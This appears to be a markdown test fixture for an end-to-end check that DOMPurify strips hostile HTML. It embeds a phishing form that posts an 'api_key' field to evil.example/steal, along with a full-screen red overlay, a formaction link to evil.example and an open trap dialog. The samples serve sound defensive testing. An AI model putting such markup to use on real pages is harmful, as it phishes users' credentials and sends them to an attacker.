# Hostile scene fixture

Used by the markdown-sanitization e2e test to verify that real-browser
DOMPurify strips phishing surfaces, inline styles, and event handlers.
All embedded tags below MUST be removed from the rendered DOM.

<form action="https://evil.example/steal" method="post">
  <input type="text" name="api_key" placeholder="Confirm your API key" autofocus>
  <button type="submit" style="background:#fff;color:#000;padding:1em">Continue</button>
</form>

<style>body { background: red !important }</style>

<p style="position:fixed;top:0;left:0;width:100vw;background:red">Overlay text</p>

<a href="https://example.com" autofocus formaction="https://evil.example">Link</a>

<dialog open>Trap dialog</dialog>

Normal markdown still works: **bold**, *italic*, and `code`.
